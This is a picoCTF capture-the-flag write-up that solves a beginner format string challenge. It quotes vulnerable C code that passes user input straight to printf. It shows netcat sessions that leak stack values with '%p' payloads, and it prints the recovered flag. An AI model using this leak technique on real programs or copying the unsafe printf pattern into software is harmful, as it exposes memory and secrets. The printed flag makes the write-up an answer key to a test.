# Ive Got A Secret
---
### Question
Hopefully you can find the right format for my secret! Source. Connect on shell2017.picoctf.com:58570.

### HINTS

This is a beginning format string attack.

---
# Solution

1. It was simple as they have given us the hint that ```format string``` attack/exploit will be used here.
   
2. Anyways we got two files again.
   ```bash
   secret secret.c
   ```
   
   The C code looks like this:
   ```C
    #include <stdio.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <stdlib.h>
    
    #define BUF_LEN 64
    char buffer[BUF_LEN];
    
    int main(int argc, char** argv) {
        int fd = open("/dev/urandom", O_RDONLY);
        if(fd == -1){
            puts("Open error on /dev/urandom. Contact an admin\n");
            return -1;
        }
        int secret;
        if(read(fd, &secret, sizeof(int)) != sizeof(int)){
            puts("Read error. Contact admin!\n");
            return -1;
        }
        close(fd);
        printf("Give me something to say!\n");
        fflush(stdout);
        fgets(buffer, BUF_LEN, stdin);
        printf(buffer);
    
        int not_secret;
        printf("Now tell my secret in hex! Secret: ");
        fflush(stdout);
        scanf("%x", &not_secret);
        if(secret == not_secret){
            puts("Wow, you got it!");
            system("cat ./flag.txt");   
        }else{
            puts("As my friend says,\"You get nothing! You lose! Good day, Sir!\"");
        }
    
        return 0;
    }
   ```
   
   Now as given in the hint format string attack.Then i quickly googled it out and saw this [Website](http://www.geeksforgeeks.org/format-string-vulnerability-and-prevention-with-example/). So now lets try to do it.
   
   ```bash
    $nc shell2017.picoctf.com 58570
    Give me something to say!
    %p %p %p %p %p %p
    0x40 0xf7fc7c20 0x8048792 0x1 0xffffdd34 0x4e1e5a04
    Now tell my secret in hex! Secret: 0xf7fc7c20
    As my friend says,"You get nothing! You lose! Good day, Sir!"
    
    $nc shell2017.picoctf.com 58570
    Give me something to say!
    %p %p %p %p %p %p
    0x40 0xf7fc7c20 0x8048792 0x1 0xffffdd34 0x7cb550cf
    Now tell my secret in hex! Secret: 0x8048792
    As my friend says,"You get nothing! You lose! Good day, Sir!"
    
    $nc shell2017.picoctf.com 58570
    Give me something to say!
    %p %p %p %p %p %p
    0x40 0xf7fc7c20 0x8048792 0x1 0xffffdd34 0x979bf793
    Now tell my secret in hex! Secret: 0xffffdd34
    As my friend says,"You get nothing! You lose! Good day, Sir!"
    
    $nc shell2017.picoctf.com 58570
    Give me something to say!
    %p %p %p %p %p %p
    0x40 0xf7fc7c20 0x8048792 0x1 0xffffdd34 0xae046ce2
    Now tell my secret in hex! Secret: 0xae046ce2
    326edd4743c7046d72d29e911ae8a412
    Wow, you got it!
   ```
   
 So, i think we got the flag ```326edd4743c7046d72d29e911ae8a412```.
 
 Hope you liked it
 
   ~Thanks
   
   [@spiritedwolf](https://github.com/spiritedwolf)

---

